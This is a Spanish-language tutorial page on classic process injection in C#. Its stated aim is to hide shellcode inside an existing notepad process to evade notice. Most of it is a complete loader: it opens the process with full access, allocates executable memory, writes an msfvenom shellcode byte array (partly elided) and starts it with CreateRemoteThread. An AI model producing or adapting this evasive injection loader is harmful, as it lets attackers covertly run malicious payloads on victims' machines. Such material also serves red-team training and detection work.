# Process Inyection C\#

En esta técnica consiste, a diferencia de la anterior en la que creábamos un proceso nuevo en el que se cargaba nuestro shellcode. Ahora lo que vamos a hacer es sobre un proceso existente cargar nuestro shellcode para pasar más desapercibidos. Para lograr esto hay que realizar una secuencia de pasos:

1. Obtener el id y el handle del proceso, esto nos permitirá leer o escribir en la memoria del proceso, eliminar puntos de interrupción o modificar la información de seguridad del proceso.
2. Guardar un espacio de memoria dentro del proceso padre.
3. Cargar el shellcode al espacio de memoria reservado.
4. Ejecutar lo que está en este espacio de memoria.



## Código

{% code lineNumbers="true" %}
```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProcessInyection
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          Int32 nSize,
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          [MarshalAs(UnmanagedType.AsAny)] object lpBuffer,
          int dwSize,
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, Boolean bInheritHandle, Int32 dwProcessId);
        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
        [Flags]

        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread( 
           IntPtr hProcess,
           IntPtr lpThreadAttributes, 
           uint dwStackSize, 
           IntPtr lpStartAddress,
           IntPtr lpParameter, 
           uint dwCreationFlags, 
           out IntPtr lpThreadId
           );


        static void Main(string[] args)
        {
            // msfvenom payload
            byte[] buf = new byte[682] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                                           . . .
                0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,
                0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };


            // 1.1 ID del proceso en el que vamos a alocar la shellcode
            int processId = Process.GetProcessesByName("notepad")[0].Id;

            // 1.2 Handler del proceso
            IntPtr handlerProcess =  OpenProcess(PROCESS_ALL_ACCESS, false, processId);

            // 1.3 Crear el espacio de memoria en el proceso
            IntPtr address =  VirtualAllocEx(handlerProcess, IntPtr.Zero, (uint) buf.Length, (uint)AllocationType.Commit| (uint)AllocationType.Reserve, (uint)MemoryProtection.ExecuteReadWrite);

            // 2.1 Copiar la shellcode a la memoria alocada
            IntPtr outNull =  IntPtr.Zero;
            WriteProcessMemory(handlerProcess, address, buf, buf.Length, out outNull);

            // 3.1 Crear un thread para ejecutar la shellcode
            CreateRemoteThread(handlerProcess, IntPtr.Zero, 0, address, IntPtr.Zero, 0, out outNull);
        }
    }
}

```
{% endcode %}



